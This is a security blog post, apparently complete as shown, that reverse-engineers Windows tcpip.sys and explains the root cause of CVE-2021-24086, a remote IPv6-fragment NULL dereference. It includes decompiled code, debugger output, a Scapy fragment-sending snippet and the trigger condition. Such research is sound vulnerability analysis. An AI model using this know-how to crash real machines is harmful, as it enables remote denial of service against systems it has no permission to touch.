<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Axel '0vercl0k' Souchet">
    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
    <style type="text/css">
      body {
        padding-top: 60px;
        padding-bottom: 40px;
      }
      .sidebar-nav {
        padding: 9px 0;
      }
      .tag-1 {
        font-size: 13pt;
      }
      .tag-2 {
        font-size: 10pt;
      }
      .tag-2 {
        font-size: 8pt;
      }
      .tag-4 {
        font-size: 6pt;
     }
    </style>
    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />

    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src='https://www.googletagmanager.com/gtag/js?id=G-MRPDMQ259W'></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MRPDMQ259W');
</script>
  </head>

  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
          <div class="nav-collapse">
            <ul class="nav">
              <ul class="nav">
                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
              </ul>

                <li >
                    <a href="../../../../../category/debugging.html">
                      <i class="icon-folder-open icon-large"></i>debugging
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/exploitation.html">
                      <i class="icon-folder-open icon-large"></i>exploitation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/misc.html">
                      <i class="icon-folder-open icon-large"></i>misc
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/obfuscation.html">
                      <i class="icon-folder-open icon-large"></i>obfuscation
                    </a>
                </li>
                <li class="active">
                    <a href="../../../../../category/reverse-engineering.html">
                      <i class="icon-folder-open icon-large"></i>reverse-engineering
                    </a>
                </li>

                <li><a href="../../../../../pages/about.html">About</a></li>
                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>

            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h1>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)">
                                        Reverse-engineering tcpip.sys: mechanics of a packet of the death (CVE-2021-24086)
                                </a>
                        </h1>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<span class="label">Date</span>
<abbr class="published" title="2021-04-15T08:00:00-07:00">
        <i class="icon-calendar"></i>Thu 15 April 2021
</abbr>
<span class="label">By</span>
<a href="../../../../../author/axel-0vercl0k-souchet.html"><i class="icon-user"></i>Axel "0vercl0k" Souchet</a>
<span class="label">Category</span>
<a href="../../../../../category/reverse-engineering.html"><i class="icon-folder-open"></i>reverse-engineering</a>


<span class="label">Tags</span>
	<a href="../../../../../tag/tcpipsys.html"><i class="icon-tag"></i>tcpip.sys</a>
	<a href="../../../../../tag/cve-2021-24086.html"><i class="icon-tag"></i>CVE-2021-24086</a>
	<a href="../../../../../tag/ipv6preassembledatagram.html"><i class="icon-tag"></i>Ipv6pReassembleDatagram</a>
	<a href="../../../../../tag/fragmentation.html"><i class="icon-tag"></i>fragmentation</a>
	<a href="../../../../../tag/recursive-fragmentation.html"><i class="icon-tag"></i>recursive-fragmentation</a>
</footer><!-- /.post-info -->                </div>
                <h1 id="introduction">Introduction</h1>
<p>Since the beginning of my journey in computer security I have always been amazed and fascinated by <em>true</em> remote vulnerabilities. By <em>true</em> remotes, I mean bugs that are triggerable remotely without any user interaction. Not even a single click. As a result  I am always on the lookout for such vulnerabilities.</p>
<p>On the Tuesday 13th of October 2020, Microsoft released a <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-16898">patch</a> for 
CVE-2020-16898 which is a vulnerability affecting Windows' <code>tcpip.sys</code> kernel-mode driver dubbed <em>Bad neighbor</em>. Here is the description from Microsoft:</p>
<div class="highlight"><pre><span></span><code>A remote code execution vulnerability exists when the Windows TCP/IP stack improperly
handles ICMPv6 Router Advertisement packets. An attacker who successfully exploited this vulnerability could gain
the ability to execute code on the target server or client. To exploit this vulnerability, an attacker would have
to send specially crafted ICMPv6 Router Advertisement packets to a remote Windows computer.
The update addresses the vulnerability by correcting how the Windows TCP/IP stack handles ICMPv6 Router Advertisement
packets.
</code></pre></div>


<p>The vulnerability really did stand out to me: remote vulnerabilities affecting TCP/IP stacks seemed extinct and being able to remotely trigger a memory corruption in the Windows kernel is very interesting for an attacker. Fascinating.</p>
<p>Hadn't diffed Microsoft patches in years I figured it would be a fun exercise to go through. I knew that I wouldn't be the only one working on it as those unicorns get a lot of attention from internet hackers. Indeed, my friend <a href="http://blog.pi3.com.pl/?p=780">pi3</a> was so fast to diff the patch, write a PoC and write a blogpost that I didn't even have time to start, oh well :)</p>
<p>That is why when Microsoft <a href="https://msrc-blog.microsoft.com/2021/02/09/multiple-security-updates-affecting-tcp-ip/">blogged</a> about another set of vulnerabilities being fixed in <code>tcpip.sys</code> I figured I might be able to work on those this time. Again, I knew for a fact that I wouldn't be the only one racing to write the first public PoC for CVE-2021-24086 but somehow the internet stayed silent long enough for me to complete this task which is very surprising :)</p>
<p>In this blogpost I will take you on my journey from zero to BSoD. From diffing the patches, reverse-engineering <code>tcpip.sys</code> and fighting our way through writing a PoC for <code>CVE-2021-2486</code>. If you came here for the code, fair enough, it is available on my <a href="https://github.com/0vercl0k">github</a>: <a href="https://github.com/0vercl0k/CVE-2021-24086">0vercl0k/CVE-2021-24086</a>.</p>
<div class="toc"><span class="toctitle">Table of contents:</span><ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#tldr">TL;DR</a></li>
<li><a href="#recon">Recon</a></li>
<li><a href="#diffing-microsoft-patches-in-2021">Diffing Microsoft patches in 2021</a></li>
<li><a href="#reverse-engineering-tcpipsys">Reverse-engineering tcpip.sys</a><ul>
<li><a href="#baby-steps">Baby steps</a></li>
<li><a href="#high-level-overview">High level overview</a><ul>
<li><a href="#zooming-out">Zooming out</a><ul>
<li><a href="#net_buffer-net_buffer_list">NET_BUFFER &amp; NET_BUFFER_LIST</a></li>
<li><a href="#the-mechanics-of-parsing-an-ipv6-packet">The mechanics of parsing an IPv6 packet</a></li>
<li><a href="#the-mechanics-of-ipv6-fragmentation">The mechanics of IPv6 fragmentation</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#theory-vs-practice-ipv6preceivefragment">Theory vs practice: Ipv6pReceiveFragment</a></li>
<li><a href="#hiding-in-plain-sight">Hiding in plain sight</a></li>
<li><a href="#manufacturing-a-packet-of-the-death-chasing-phantoms">Manufacturing a packet of the death: chasing phantoms</a></li>
<li><a href="#manufacturing-a-packet-of-the-death-leap-of-faith">Manufacturing a packet of the death: leap of faith</a></li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#bonus-cve-2021-24074">Bonus: CVE-2021-24074</a></li>
</ul>
</div>
<h1 id="tldr">TL;DR</h1>
<p>For the readers that want to get the scoop, CVE-2021-24086 is a NULL dereference in <code>tcpip!Ipv6pReassembleDatagram</code> that can be triggered remotely by sending a series of specially crafted packets. The issue happens because of the way the code treats the network buffer:</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">Ipv6pReassembleDatagram</span><span class="p">(</span><span class="n">Packet_t</span> <span class="o">*</span><span class="n">Packet</span><span class="p">,</span> <span class="n">Reassembly_t</span> <span class="o">*</span><span class="n">Reassembly</span><span class="p">,</span> <span class="kt">char</span> <span class="n">OldIrql</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">UnfragmentableLength</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableLength</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">TotalLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span> <span class="o">+</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">DataLength</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">HeaderAndOptionsLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">);</span>
  <span class="c1">// …</span>
  <span class="n">NetBufferList</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NET_BUFFER_LIST</span> <span class="o">*</span><span class="p">)</span><span class="n">NetioAllocateAndReferenceNetBufferAndNetBufferList</span><span class="p">(</span>
                                        <span class="n">IppReassemblyNetBufferListsComplete</span><span class="p">,</span>
                                        <span class="n">Reassembly</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">NetBufferList</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">goto</span> <span class="n">Bail_0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">FirstNetBuffer</span> <span class="o">=</span> <span class="n">NetBufferList</span><span class="o">-&gt;</span><span class="n">FirstNetBuffer</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">NetioRetreatNetBuffer</span><span class="p">(</span><span class="n">FirstNetBuffer</span><span class="p">,</span> <span class="kt">uint16_t</span><span class="p">(</span><span class="n">HeaderAndOptionsLength</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">goto</span> <span class="n">Bail_1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipv6_header_t</span> <span class="o">*</span><span class="p">)</span><span class="n">NdisGetDataBuffer</span><span class="p">(</span><span class="n">FirstNetBuffer</span><span class="p">,</span> <span class="n">HeaderAndOptionsLength</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="c1">//...</span>
  <span class="o">*</span><span class="n">Buffer</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">;</span>
</code></pre></div>


<p>A fresh NetBufferList (abbreviated NBL) is allocated by <code>NetioAllocateAndReferenceNetBufferAndNetBufferList</code> and <code>NetioRetreatNetBuffer</code> allocates an MDL of <code>uint16_t(HeaderAndOptionsLength)</code>. This integer truncation from <code>uint32_t</code> is important.</p>
<p>Once the network buffer has been allocated, <code>NdisGetDataBuffer</code> is called to gain access to a contiguous block of data from the fresh network buffer. This time though, <code>HeaderAndOptionsLength</code> is not truncated which allows an attacker to trigger a special condition in <code>NdisGetDataBuffer</code> to make it fail. This condition is hit when <code>uint16_t(HeaderAndOptionsLength) != HeaderAndOptionsLength</code>. When the function fails, it returns NULL and <code>Ipv6pReassembleDatagram</code> blindly trusts this pointer and does a memory write, bugchecking the machine. To pull this off, you need to trick the network stack into receiving an IPv6 fragment with a very large amount of headers. Here is what the bugchecks look like:</p>
<p><center><img alt="trigger" src="/images/reverse_engineering_tcpip/trigger.gif"></center></p>
<div class="highlight"><pre><span></span><code>KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x000000d1
                       (0x0000000000000000,0x0000000000000002,0x0000000000000001,0xFFFFF8054A5CDEBB)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff805`473c46a0 cc              int     3

kd&gt; kc
 # Call Site
00 nt!DbgBreakPointWithStatus
01 nt!KiBugCheckDebugBreak
02 nt!KeBugCheck2
03 nt!KeBugCheckEx
04 nt!KiBugCheckDispatch
05 nt!KiPageFault
06 tcpip!Ipv6pReassembleDatagram
07 tcpip!Ipv6pReceiveFragment
08 tcpip!Ipv6pReceiveFragmentList
09 tcpip!IppReceiveHeaderBatch
0a tcpip!IppFlcReceivePacketsCore
0b tcpip!IpFlcReceivePackets
0c tcpip!FlpReceiveNonPreValidatedNetBufferListChain
0d tcpip!FlReceiveNetBufferListChainCalloutRoutine
0e nt!KeExpandKernelStackAndCalloutInternal
0f nt!KeExpandKernelStackAndCalloutEx
10 tcpip!FlReceiveNetBufferListChain
11 NDIS!ndisMIndicateNetBufferListsToOpen
12 NDIS!ndisMTopReceiveNetBufferLists
</code></pre></div>


<p>For anybody else in for a long ride, let's get to it :)</p>
<h1 id="recon">Recon</h1>
<p>Even though <a href="https://twitter.com/fdfalcon">Francisco Falcon</a> already wrote a cool <a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">blogpost</a> discussing his work on this case, I have decided to also write up mine; I'll try to cover aspects that are less or not covered in his post like <code>tcpip.sys</code> internals for example.</p>
<p>All right, let's start by the beginning: at this point I don't know anything about <code>tcpip.sys</code> and I don't know anything about the bugs getting patched. Microsoft's blogpost is helpful because it gives us a bunch of clues:</p>
<ul>
<li>There are three different vulnerabilities that seemed to involve fragmentation in IPv4 &amp; IPv6,</li>
<li>Two of them are rated as <em>Remote Code Execution</em> which means that they cause memory corruption somehow,</li>
<li>One of them causes a DoS which means somehow it likely bugchecks the target. </li>
</ul>
<p>According to this <a href="https://twitter.com/metr0/status/1359214923541192704">tweet</a> we also learn that those flaws have been internally found by Microsoft's own <a href="https://twitter.com/piazzt">@piazzt</a> which is awesome.</p>
<p>Googling around also reveals a bunch more useful information due to the fact that it would seem that Microsoft privately shared with their partners PoCs via the <a href="https://www.microsoft.com/en-us/msrc/mapp">MAPP program</a>.</p>
<p>At this point I decided to focus on the DoS vulnerability (CVE-2021-2486) as a first step. I figured it might be easier to trigger and that I might be able to use the acquired knowledge for triggering it to understand better <code>tcpip.sys</code> and maybe work on the other ones if time and motivation allows.</p>
<p>The next logical step is to diff the patches to identify the fixes.</p>
<h1 id="diffing-microsoft-patches-in-2021">Diffing Microsoft patches in 2021</h1>
<p>I honestly can't remember the last time I diff'd Microsoft patches. Probably Windows XP / Windows 7 time to be honest. Since then, a lot has changed though. The security updates are now cumulative, which means that packages embed every fix known to date. You can grab packages directly from the <a href="https://www.catalog.update.microsoft.com/home.aspx">Microsoft Update Catalog</a> which is handy. Last but not least, Windows Updates now use forward / reverse differentials; you can read <a href="https://docs.microsoft.com/en-us/windows/deployment/update/psfxwhitepaper">this</a> to know more about what it means.</p>
<p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a> is a great blog post that talks about how to unpack the patches off an update package and how to apply the differentials. The output of this work is basically the <code>tcpip.sys</code> binary before and after the update. If you don't feel like doing this yourself, I've uploaded the two binaries (as well as their respective public PDBs) that you can use to do the diffing yourself: <a href="https://github.com/0vercl0k/CVE-2021-24086/tree/main/binaries">0vercl0k/CVE-2021-24086/binaries</a>.</p>
<p>Once we have the before and after binaries, a little dance with <a href="https://www.hex-rays.com/products/ida/">IDA</a> and the good ol’ <a href="https://www.zynamics.com/software.html">BinDiff</a> yields the below:</p>
<p><center><img alt="bindiff" src="/images/reverse_engineering_tcpip/bindiff0.png"></center></p>
<p>There aren't a whole lot of changes to look at which is nice, and focusing on <code>Ipv6pReassembleDatagram</code> feels right. Microsoft's workaround mentioned disabling packet reassembly (<code>netsh int ipv6 set global reassemblylimit=0</code>) and this function seems to be reassembling datagrams; close enough right?</p>
<p>After looking at it for a little time, the patched binary introduced this new interesting looking basic block:</p>
<p><center><img alt="bindiff" src="/images/reverse_engineering_tcpip/bindiff1.png"></center></p>
<p>It ends with what looks like a comparison with the <code>0xffff</code> integer and a conditional jump that either bails out or keeps going. This looks very interesting because some articles mentioned that the bug could be triggered with a packet containing a large amount of headers. Not that you should trust those types of news articles as they are usually not technically accurate and sensationalized, but there might be some truth to it. At this point, I felt pretty good about it and decided to stop diffing and start reverse-engineering. I assumed the issue would be some sort of integer overflow / truncation that would be easy to trigger based on the name of the function. We just need to send a big packet right?</p>
<h1 id="reverse-engineering-tcpipsys">Reverse-engineering tcpip.sys</h1>
<p>This is where the real journey and the usual emotional rollercoasters when studying vulnerabilities. I initially thought I would be done with this in a few days, or a week. Oh boy, I was wrong though.</p>
<h2 id="baby-steps">Baby steps</h2>
<p>First thing I did was to prepare a lab environment. I installed a Windows 10 (target) and a Linux VM (attacker), set-up KDNet and kernel debugging to debug the target, installed <a href="https://www.wireshark.org/">Wireshark</a> / <a href="https://github.com/secdev/scapy">Scapy</a> (v2.4.4), created a virtual switch which the two VMs are sharing. And... finally loaded <code>tcpip.sys</code> in IDA. The module looked pretty big and complex at first sights - no big surprise there; it implements Windows IPv4 &amp; IPv6 network stack after all. I started the adventure by focusing first on <code>Ipv6pReassembleDatagram</code>. Here is the piece of assembly code that we saw earlier in BinDiff and that looked interesting:</p>
<p><center><img alt="ida" src="/images/reverse_engineering_tcpip/ida0.png"></center></p>
<p>Great, that's a start. Before going deep down the rabbit hole of reverse-engineering, I decided to try to hit the function and be able to debug it with WinDbg. As the function name suggests reassembly I wrote the following code and threw it against my target:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pkt</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;ff02::1&#39;</span><span class="p">)</span> <span class="o">/</span> <span class="n">UDP</span><span class="p">()</span> <span class="o">/</span> <span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">)</span>
<span class="n">sendp</span><span class="p">(</span><span class="n">fragment6</span><span class="p">(</span><span class="n">pkt</span><span class="p">,</span> <span class="mi">500</span><span class="p">),</span> <span class="n">iface</span> <span class="o">=</span> <span class="s1">&#39;eth1&#39;</span><span class="p">)</span>
</code></pre></div>


<p>This successfully triggers the breakpoint in WinDbg; neat:</p>
<div class="highlight"><pre><span></span><code>kd&gt; g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff802`2edcdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

kd&gt; kc
 # Call Site
00 tcpip!Ipv6pReassembleDatagram
01 tcpip!Ipv6pReceiveFragment
02 tcpip!Ipv6pReceiveFragmentList
03 tcpip!IppReceiveHeaderBatch
04 tcpip!IppFlcReceivePacketsCore
05 tcpip!IpFlcReceivePackets
06 tcpip!FlpReceiveNonPreValidatedNetBufferListChain
07 tcpip!FlReceiveNetBufferListChainCalloutRoutine
08 nt!KeExpandKernelStackAndCalloutInternal
09 nt!KeExpandKernelStackAndCalloutEx
0a tcpip!FlReceiveNetBufferListChain
</code></pre></div>


<p>We can even observe the fragmented packets in Wireshark which is also pretty cool:</p>
<p><center><img alt="wireshark" src="/images/reverse_engineering_tcpip/ws0.png"></center></p>
<p>For those that are not familiar with packet fragmentation, it is a mechanism used to chop large packets (larger than the <a href="https://en.wikipedia.org/wiki/Maximum_transmission_unit">Maximum Transmission Unit</a>) in smaller chunks to be able to be sent across network equipment. The receiving network stack has the burden to stitch them all together in a safe manner (winkwink).</p>
<p>All right, perfect. We have now what I consider a good enough research environment and we can start digging deep into the code. At this point, let's not focus on the vulnerability yet but instead try to understand how the code works, the type of arguments it receives, recover structures and the semantics of important fields, etc. Let's get our HexRays decompilation output pretty.</p>
<p>As you might imagine, this is the part that's the most time consuming. I use a mixture of bottom-up, top-down. Loads of experiments. Commenting the decompiled code as best as I can, challenging myself by asking questions, answering them, rinse &amp; repeat.</p>
<h2 id="high-level-overview">High level overview</h2>
<p>Oftentimes, studying code / features in isolation in complex systems is not enough; it only takes you so far. Complex drivers like <code>tcpip.sys</code> are gigantic, carry a lot of state, and are hard to reason about, both in terms of execution and data flow. In this case, there is this sort of size integer, that seems to be related to something that got received and we want to set that to 0xffff. Unfortunately, just focusing on <code>Ipv6pReassembleDatagram</code> and <code>Ipv6pReceiveFragment</code> was not enough for me to make significant progress. It was worth a try though but time to switch gears.</p>
<h3 id="zooming-out">Zooming out</h3>
<p>All right, that's cool, our HexRays decompiled code is getting prettier and prettier; it feels rewarding. We have abused the <em>create new structure</em> feature to lift a bunch of structures. We guessed about the semantics of some of them but most are still unknown. So yeah, let's work smarter.</p>
<p>We know that <code>tcpip.sys</code> receives packets from the network; we don't know exactly how or where from but maybe we don't need to know that much. One of the first questions you might ask yourself is how the kernel stores network data? What structures does it use?</p>
<h4 id="net_buffer-net_buffer_list">NET_BUFFER &amp; NET_BUFFER_LIST</h4>
<p>If you have some Windows kernel experience, you might be familiar with <a href="https://en.wikipedia.org/wiki/Network_Driver_Interface_Specification">NDIS</a> and you might also have heard about some of the APIs and the structures it exposes to users. It is documented because third-parties can develop extensions and drivers to interact with the network stack at various points.</p>
<p>An important structure in this world is <code>NET_BUFFER</code>. This is what it looks like in WinDbg:</p>
<div class="highlight"><pre><span></span><code>kd&gt; dt NDIS!_NET_BUFFER
NDIS!_NET_BUFFER
   +0x000 Next             : Ptr64 _NET_BUFFER
   +0x008 CurrentMdl       : Ptr64 _MDL
   +0x010 CurrentMdlOffset : Uint4B
   +0x018 DataLength       : Uint4B
   +0x018 stDataLength     : Uint8B
   +0x020 MdlChain         : Ptr64 _MDL
   +0x028 DataOffset       : Uint4B
   +0x000 Link             : _SLIST_HEADER
   +0x000 NetBufferHeader  : _NET_BUFFER_HEADER
   +0x030 ChecksumBias     : Uint2B
   +0x032 Reserved         : Uint2B
   +0x038 NdisPoolHandle   : Ptr64 Void
   +0x040 NdisReserved     : [2] Ptr64 Void
   +0x050 ProtocolReserved : [6] Ptr64 Void
   +0x080 MiniportReserved : [4] Ptr64 Void
   +0x0a0 DataPhysicalAddress : _LARGE_INTEGER
   +0x0a8 SharedMemoryInfo : Ptr64 _NET_BUFFER_SHARED_MEMORY
   +0x0a8 ScatterGatherList : Ptr64 _SCATTER_GATHER_LIST
</code></pre></div>


<p>It can look overwhelming but we don't need to understand every detail. What is important is that the network data are stored in a regular <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls">MDL</a>. As MDLs, <em>NET_BUFFER</em> can be chained together which allows the kernel to store a large amount of data in a bunch of non-contiguous chunks of physical memory; virtual memory is the magic wand used to make the data look contiguous. For the readers that are not familiar with Windows kernel development, an MDL is a Windows kernel construct that allows users to map physical memory in a contiguous virtual memory region. Every MDL is actually followed by a list of <code>PFNs</code> (which don't need to be contiguous) that the Windows kernel is able to map in a contiguous virtual memory region; magic.</p>
<div class="highlight"><pre><span></span><code>kd&gt; dt nt!_MDL
   +0x000 Next             : Ptr64 _MDL
   +0x008 Size             : Int2B
   +0x00a MdlFlags         : Int2B
   +0x00c AllocationProcessorNumber : Uint2B
   +0x00e Reserved         : Uint2B
   +0x010 Process          : Ptr64 _EPROCESS
   +0x018 MappedSystemVa   : Ptr64 Void
   +0x020 StartVa          : Ptr64 Void
   +0x028 ByteCount        : Uint4B
   +0x02c ByteOffset       : Uint4B
</code></pre></div>


<p><code>NET_BUFFER_LIST</code> are basically a structure to keep track of a list of <code>NET_BUFFERs</code> as the name suggests:</p>
<div class="highlight"><pre><span></span><code>kd&gt; dt NDIS!_NET_BUFFER_LIST
   +0x000 Next             : Ptr64 _NET_BUFFER_LIST
   +0x008 FirstNetBuffer   : Ptr64 _NET_BUFFER
   +0x000 Link             : _SLIST_HEADER
   +0x000 NetBufferListHeader : _NET_BUFFER_LIST_HEADER
   +0x010 Context          : Ptr64 _NET_BUFFER_LIST_CONTEXT
   +0x018 ParentNetBufferList : Ptr64 _NET_BUFFER_LIST
   +0x020 NdisPoolHandle   : Ptr64 Void
   +0x030 NdisReserved     : [2] Ptr64 Void
   +0x040 ProtocolReserved : [4] Ptr64 Void
   +0x060 MiniportReserved : [2] Ptr64 Void
   +0x070 Scratch          : Ptr64 Void
   +0x078 SourceHandle     : Ptr64 Void
   +0x080 NblFlags         : Uint4B
   +0x084 ChildRefCount    : Int4B
   +0x088 Flags            : Uint4B
   +0x08c Status           : Int4B
   +0x08c NdisReserved2    : Uint4B
   +0x090 NetBufferListInfo : [29] Ptr64 Void
</code></pre></div>


<p>Again, no need to understand every detail, thinking in concepts is good enough. On top of that, Microsoft makes our life easier by providing a very useful WinDbg extension called <code>ndiskd</code>. It exposes two functions to dump <code>NET_BUFFER</code> and <code>NET_BUFFER_LIST</code>: <code>!ndiskd.nb</code> and <code>!ndiskd.nbl</code> respectively. These are a big time saver because they'll take care of walking the various levels of indirection: list of <code>NET_BUFFERs</code> and chains of <code>MDLs</code>.</p>
<h4 id="the-mechanics-of-parsing-an-ipv6-packet">The mechanics of parsing an IPv6 packet</h4>
<p>Now that we know where and how network data is stored, we can ask ourselves how IPv6 packet parsing works? I have very little knowledge about networking, but I know that there are various headers that need to be parsed differently and that they can chain together. The layer N tells you what you'll find next.</p>
<p>What I am about to describe is what I have figured out while reverse-engineering as well as what I have observed during debugging it through a bazillions of experiments. Full disclosure: I am no expert so take it with a grain of salt :)</p>
<p>The top level function of interest is <code>IppReceiveHeaderBatch</code>. The first thing it does is to invoke <code>IppReceiveHeadersHelper</code> on every packet that are in the list:</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span> <span class="n">Packet</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="k">do</span>
    <span class="p">{</span>
        <span class="n">Next</span> <span class="o">=</span> <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">;</span>
        <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">IppReceiveHeadersHelper</span><span class="p">(</span><span class="n">Packet</span><span class="p">,</span> <span class="n">Protocol</span><span class="p">,</span> <span class="p">...);</span>
        <span class="n">Packet</span> <span class="o">=</span> <span class="n">Next</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">Next</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div>


<p><code>Packet_t</code> is an undocumented structure that is associated with received packets. A bunch of state is stored in this structure and figuring out the semantics of important fields is time consuming. <code>IppReceiveHeadersHelper</code>'s main role is to kick off the parsing machine. It parses the IPv6 (or IPv4) header of the packet and reads the <code>next_header</code> field. As I mentioned above, this field is very important because it indicates how to read the next layer of the packet. This value is kept in the <code>Packet</code> structure, and a bunch of functions reads and updates it during parsing.</p>
<div class="highlight"><pre><span></span><code><span class="n">NetBufferList</span> <span class="o">=</span> <span class="n">Packet</span><span class="o">-&gt;</span><span class="n">NetBufferList</span><span class="p">;</span>
<span class="n">HeaderSize</span> <span class="o">=</span> <span class="n">Protocol</span><span class="o">-&gt;</span><span class="n">HeaderSize</span><span class="p">;</span>
<span class="n">FirstNetBuffer</span> <span class="o">=</span> <span class="n">NetBufferList</span><span class="o">-&gt;</span><span class="n">FirstNetBuffer</span><span class="p">;</span>
<span class="n">CurrentMdl</span> <span class="o">=</span> <span class="n">FirstNetBuffer</span><span class="o">-&gt;</span><span class="n">CurrentMdl</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">CurrentMdl</span><span class="o">-&gt;</span><span class="n">MdlFlags</span> <span class="o">&amp;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">Va</span> <span class="o">=</span> <span class="n">CurrentMdl</span><span class="o">-&gt;</span><span class="n">MappedSystemVa</span><span class="p">;</span>
<span class="k">else</span>
    <span class="n">Va</span> <span class="o">=</span> <span class="n">MmMapLockedPagesSpecifyCache</span><span class="p">(</span><span class="n">CurrentMdl</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MmCached</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40000000u</span><span class="p">);</span>
<span class="n">IpHdr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipv6_header_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">Va</span> <span class="o">+</span> <span class="n">FirstNetBuffer</span><span class="o">-&gt;</span><span class="n">CurrentMdlOffset</span><span class="p">);</span>
